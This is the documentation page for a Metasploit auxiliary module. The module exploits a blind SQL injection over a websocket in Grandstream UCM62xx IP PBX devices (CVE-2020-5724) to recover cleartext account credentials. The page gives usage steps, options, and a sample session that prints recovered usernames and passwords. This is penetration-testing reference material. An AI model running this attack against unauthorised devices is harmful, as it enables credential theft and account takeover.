## Vulnerable Application

### Description

This module uses a blind SQL injection (CVE-2020-5724) affecting the Grandstream UCM62xx
IP PBX to dump the user database. The injection occurs over a websocket at the websockify
endpoint, and specifically occurs when the user requests the challenge (as part of a
challenge and response authentication scheme). The injection is blind, but the server
response contains a different status code if the query was successful. As such, the
attacker can guess the contents of the user database. Most helpfully, the passwords are
stored in cleartext within the user table (CVE-2020-5723).

This issue was patched in Grandstream UCM62xx IP PBX frimware version 1.20.22.

### Installation

The UCM62xx PBX is a physical device and is not known to have been successfully emulated.
However, if you have a device, affected firmware can be downloaded here:

* http://firmware.grandstream.com/Release_UCM62xx_1.0.20.22.zip

## Verification Steps

* Acquire an affected device and configure it with the affected firmware
* Do: `use auxiliary/scanner/http/grandstream_ucm62xx_sql_account_guess`
* Do: `set RHOST <ip>`
* Do: `run`
* You should get a list of valid credentials for the target device.

## Options

### TARGETURI

Specifies base URI. The default value is `/`.

### ID_SCAN

Indicates the total number of user IDs to scan for. The module starts by scanning the
database for valid user ids. The IDs are sequential starting at 0. The default
scans the first 30 IDs which would be 0 - 29.

### STRING_FIELD_LENGTH

Indicates the maximum length of the string fields (username and password) that
we'll allow for in our SQLi guessing.

## Scenarios

### Grandstream UCM6202 IP PBX firmware version 1.0.20.20

```
msf6 > use auxiliary/scanner/http/grandstream_ucm62xx_sql_account_guess
msf6 auxiliary(scanner/http/grandstream_ucm62xx_sql_account_guess) > set RHOST 10.0.0.9
RHOST => 10.0.0.9
msf6 auxiliary(scanner/http/grandstream_ucm62xx_sql_account_guess) > show options

Module options (auxiliary/scanner/http/grandstream_ucm62xx_sql_account_guess):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   ID_SCAN    30               yes       The number of initial user ids to scan
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.0.0.9         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      8089             yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host

msf6 auxiliary(scanner/http/grandstream_ucm62xx_sql_account_guess) > run

[*] Requesting version information from /cgi
[*] The reported version is: 1.0.20.20
[*] Found 6 valid user ids
[*] Found username: admin
[*] Found password: cheesed00dle
[*] Found username: 1000
[*] Found password: gZ15S8O8U5S72oli
[*] Found username: 1001
[*] Found password: qK6uRxwC
[*] Found username: 1002
[*] Found password: aP9ux515W7p5U
[*] Found username: 1003
[*] Found password: pM6mo!E8u37k
[*] Found username: 1004
[*] Found password: mC7N68dm8h
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/grandstream_ucm62xx_sql_account_guess) > 
```
